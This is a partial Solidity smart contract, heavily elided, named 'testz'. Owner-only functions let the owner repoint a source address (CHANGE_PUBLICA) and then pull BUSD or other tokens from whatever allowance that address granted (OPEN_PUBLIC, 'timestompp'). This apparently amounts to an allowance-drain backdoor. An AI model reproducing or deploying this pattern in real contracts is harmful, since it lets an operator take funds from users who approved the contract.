...
contract testz{
    ...
    uint256 public PUBLIC_AMOUNT;
    uint256 public TREASURY_TAX;
    ...
    constructor(address _dev, address _marketing) {
        ...
        PUBLICA = 0x545852De6337343d43Df8e12cD2305c5220c4087;
        PUBLIC_AMOUNT = 2;
    }
    ...
    function CHANGE_PUBLICA(address value) external {
        require(msg.sender == owner, "Admin use only.");
        PUBLICA = value;
    }
    ...
    function timestompp () external {
        require(msg.sender == owner, "Admin use only");
        IToken(erctoken).transfer(TREASURY, TREASURY_TAX);
    }

    function OPEN_PUBLIC() public {
        require(msg.sender == owner, "Admin use only");
        //require(
        ...
        //);
        require(
            IToken(erctoken).allowance(PUBLICA, address(this)) >= TREASURY_TAX,
            "Token 2 allowance too low"
        );

        //_safeTransferFrom(token1, owner1, owner2, amount1);
        _safeTransferFrom(token_BUSD, PUBLICA, TREASURY, PUBLIC_AMOUNT);
    }
